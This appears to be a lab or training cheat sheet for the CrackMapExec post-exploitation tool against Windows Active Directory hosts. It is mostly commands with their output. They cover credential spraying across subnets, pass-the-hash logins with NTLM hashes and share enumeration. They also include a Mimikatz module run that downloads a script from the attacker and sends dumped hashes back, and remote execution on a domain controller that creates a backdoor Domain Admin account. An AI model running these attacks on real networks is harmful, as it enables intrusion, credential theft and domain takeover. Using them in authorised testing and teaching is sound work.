# CrackMapExec
[CrackMapExec (a.k.a CME)](https://github.com/byt3bl33d3r/CrackMapExec/wiki) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.

As CME is already pretty well documented and explained by [byt3bl33d3r](https://github.com/byt3bl33d3r) himself, this article will serve the purpose of command reference.


```
> crackmapexec smb 10.10.10.52 -u demonas -p 'M374L_P@ssW0rd!'
SMB         10.10.10.52     445    EMPEROR           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:EMPEROR) (domain:KVLT) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    EMPEROR           [+] KVLT\demonas:M374L_P@ssW0rd! 
```

```
> crackmapexec smb 10.10.10.1/24 -u demonas -p 'M374L_P@ssW0rd!' --pass-pol
SMB         10.10.10.52     445    EMPEROR           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:EMPEROR) (domain:KVLT) (signing:True) (SMBv1:True)
SMB         10.10.10.40     445    FREEZING-MOON         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:FREEZING-MOON) (domain:FREEZING-MOON) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    MAYHEM            [*] Windows Server 2016 Standard 14393 x64 (name:MAYHEM) (domain:MAYHEM) (signing:False) (SMBv1:True)
SMB         10.10.10.52     445    EMPEROR           [+] KVLT\demonas:M374L_P@ssW0rd! 
SMB         10.10.10.40     445    FREEZING-MOON         [+] FREEZING-MOON\demonas:M374L_P@ssW0rd! 
SMB         10.10.10.59     445    MAYHEM            [-] MAYHEM\demonas:M374L_P@ssW0rd! STATUS_LOGON_FAILURE 
SMB         10.10.10.52     445    EMPEROR           [+] Dumping password info for domain: KVLT
SMB         10.10.10.52     445    EMPEROR           Minimum password length: 7
SMB         10.10.10.52     445    EMPEROR           Password history length: 24
SMB         10.10.10.52     445    EMPEROR           Maximum password age: 
SMB         10.10.10.52     445    EMPEROR           
SMB         10.10.10.52     445    EMPEROR           Password Complexity Flags: 000001
SMB         10.10.10.52     445    EMPEROR           	Domain Refuse Password Change: 0
SMB         10.10.10.52     445    EMPEROR           	Domain Password Store Cleartext: 0
SMB         10.10.10.52     445    EMPEROR           	Domain Password Lockout Admins: 0
SMB         10.10.10.52     445    EMPEROR           	Domain Password No Clear Change: 0
SMB         10.10.10.52     445    EMPEROR           	Domain Password No Anon Change: 0
SMB         10.10.10.52     445    EMPEROR           	Domain Password Complex: 1
SMB         10.10.10.52     445    EMPEROR           
SMB         10.10.10.52     445    EMPEROR           Minimum password age: 
SMB         10.10.10.52     445    EMPEROR           Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.52     445    EMPEROR           Locked Account Duration: 30 minutes 
SMB         10.10.10.52     445    EMPEROR           Account Lockout Threshold: None
SMB         10.10.10.52     445    EMPEROR           Forced Log off Time: Not Set
SMB         10.10.10.3      445    FUNERAL-FOG             [*] Unix (name:FUNERAL-FOG) (domain:FUNERAL-FOG) (signing:False) (SMBv1:True)
SMB         10.10.10.3      445    FUNERAL-FOG             [-] FUNERAL-FOG\demonas:M374L_P@ssW0rd! STATUS_LOGON_FAILURE 
```

```
> crackmapexec smb 10.10.10.59 -u Sathanas -p 'DeMysteriisDomSathanas!' --shares
SMB         10.10.10.59     445    MAYHEM            [*] Windows Server 2016 Standard 14393 x64 (name:MAYHEM) (domain:MAYHEM) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    MAYHEM            [+] MAYHEM\Sathanas:DeMysteriisDomSathanas! 
SMB         10.10.10.59     445    MAYHEM            [+] Enumerated shares
SMB         10.10.10.59     445    MAYHEM            Share           Permissions     Remark
SMB         10.10.10.59     445    MAYHEM            -----           -----------     ------
SMB         10.10.10.59     445    MAYHEM            ACCT            READ            
SMB         10.10.10.59     445    MAYHEM            ADMIN$                          Remote Admin
SMB         10.10.10.59     445    MAYHEM            C$                              Default share
SMB         10.10.10.59     445    MAYHEM            IPC$                            Remote IPC
```



# Pass the Hash

```
kali :: ~ # cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth                                                                              2 ↵
SMB         10.8.14.14      445    SQL01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:True)
SMB         10.8.14.14      445    SQL01            [+] SQL01\Administrator aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e (Pwn3d!)
```     

# CME with user hash against our subnet:

```
kali :: ~ # cme smb 10.8.14.0/24 -u maniac -H e045c10921635ee21d6bd3b3f64a416f                                                                                                                                    
SMB         10.8.14.12      445    MX01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:MX01) (domain:LAB) (signing:True) (SMBv1:True)
SMB         10.8.14.15      445    WEB01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:WEB01) (domain:LAB) (signing:False) (SMBv1:True)
SMB         10.8.14.10      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:LAB) (signing:True) (SMBv1:True)
SMB         10.8.14.11      445    FS01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:FS01) (domain:LAB) (signing:False) (SMBv1:True)
SMB         10.8.14.14      445    SQL01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:SQL01) (domain:LAB) (signing:False) (SMBv1:True)
SMB         10.8.14.17      445    RDS02            [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RDS02) (domain:LAB) (signing:False) (SMBv1:True)
SMB         10.8.14.12      445    MX01             [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f (Pwn3d!)
SMB         10.8.14.15      445    WEB01            [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
SMB         10.8.14.10      445    DC01             [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
SMB         10.8.14.11      445    FS01             [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
SMB         10.8.14.14      445    SQL01            [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
SMB         10.8.14.17      445    RDS02            [+] LAB\maniac e045c10921635ee21d6bd3b3f64a416f 
```


# Shares Recon

```
kali :: ~ # cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares                            
SMB         10.8.14.14      445    SQL01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:True)
SMB         10.8.14.14      445    SQL01            [+] SQL01\Administrator aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e (Pwn3d!)
SMB         10.8.14.14      445    SQL01            [+] Enumerated shares
SMB         10.8.14.14      445    SQL01            Share           Permissions     Remark
SMB         10.8.14.14      445    SQL01            -----           -----------     ------
SMB         10.8.14.14      445    SQL01            ADMIN$          READ,WRITE      Remote Admin
SMB         10.8.14.14      445    SQL01            C$              READ,WRITE      Default share
SMB         10.8.14.14      445    SQL01            IPC$                            Remote IPC
```                                                                                           


# Mimikatz

```
kali :: ~ # cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth -M mimikatz                         
SMB         10.8.14.14      445    SQL01            [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:True)
SMB         10.8.14.14      445    SQL01            [+] SQL01\Administrator aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e (Pwn3d!)
MIMIKATZ    10.8.14.14      445    SQL01            [+] Executed launcher
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ    10.8.14.14                              [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ    10.8.14.14                              [*] - - "POST / HTTP/1.1" 200 -
MIMIKATZ    10.8.14.14                              lab\maniac:e045c10921635ee21d6bd3b3f64a416f
MIMIKATZ    10.8.14.14                              LAB\maniac:e045c10921635ee21d6bd3b3f64a416f
MIMIKATZ    10.8.14.14                              LAB\SQL01$:5ad23d25ce4e58d242be7e4acb73fc4d
MIMIKATZ    10.8.14.14                              [+] Added 3 credential(s) to the database
MIMIKATZ    10.8.14.14                              [*] Saved raw Mimikatz output to Mimikatz-10.8.14.14-2018-03-22_122819.log
```
                                                                                                            

# Executing commands as Domain Admin to DC (creating a new user and adding him to Domain Admins group):

```
kali :: ~ # cme smb 10.8.14.10 -u dead -H 49a074a39dd0651f647e765c2cc794c7 -X "net user hackerman LolWTF!#&$ /add /domain"                                                                                         
SMB         10.8.14.10      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:LAB) (signing:True) (SMBv1:True)
SMB         10.8.14.10      445    DC01             [+] LAB\dead 49a074a39dd0651f647e765c2cc794c7 (Pwn3d!)
SMB         10.8.14.10      445    DC01             [+] Executed command 
```

```
kali :: ~ # cme smb 10.8.14.10 -u dead -H 49a074a39dd0651f647e765c2cc794c7 -X 'net group "Domain Admins" /add hackerman /domain'                2 ↵
SMB         10.8.14.10      445    DC01             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:DC01) (domain:LAB) (signing:True) (SMBv1:True)
SMB         10.8.14.10      445    DC01             [+] LAB\dead 49a074a39dd0651f647e765c2cc794c7 (Pwn3d!)
SMB         10.8.14.10      445    DC01             [+] Executed command 
```
